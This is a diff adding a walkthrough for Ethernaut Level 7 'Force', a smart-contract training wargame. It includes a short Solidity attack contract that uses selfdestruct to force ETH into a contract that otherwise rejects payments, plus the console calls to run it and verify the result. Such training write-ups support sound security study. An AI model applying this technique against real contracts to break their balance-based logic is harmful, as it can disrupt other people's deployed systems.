@@ -307,3 +307,57 @@ To verify that the `owner` is now the player.
 
 ## Level completed
 ![Level Complete Output](assets/Delegation.png)
+
+
+# Ethernaut Level 7: Force
+
+## Strategy
+
+- **Vulnerability**: The `Force` contract does not implement either `receive()` or `fallback()` functions, which means it rejects any direct transfer of ETH using `send()`, `transfer()`, or even `call{value: ...}`.
+- **Exploit**: We bypass this restriction by using the `selfdestruct()` function in another contract. When a contract self-destructs, it forcibly sends its balance to the specified address, regardless of whether that address can normally receive ETH. This allows us to inject ETH into `Force`.
+
+---
+
+## Commands Used
+
+### 1. Create an attack contract with `selfdestruct`
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ForceAttack {
+    constructor() payable {}
+
+    function destroy(address payable _target) public {
+        selfdestruct(_target);
+    }
+}
+```
+The `destroy()` function will forcefully send ETH to the `Force` contract's address.
+
+---
+
+### 2. Deployed `ForceAttack` with 1 Wei
+
+To give the contract some balance that it can push to the target via `selfdestruct`.
+
+---
+
+### 3. Call the `destroy()` function with the Force instance address
+```
+await contract.destroy("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
+```
+To execute `selfdestruct` and force ETH into the `Force` contract.
+
+---
+
+### 4. Confirm the contract balance is now greater than 0
+```
+await web3.eth.getBalance("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
+```
+This confirms the ETH was successfully transferred and the level is complete.
+
+---
+
+## Level completed
+![Level Complete Output](assets/Force.png)
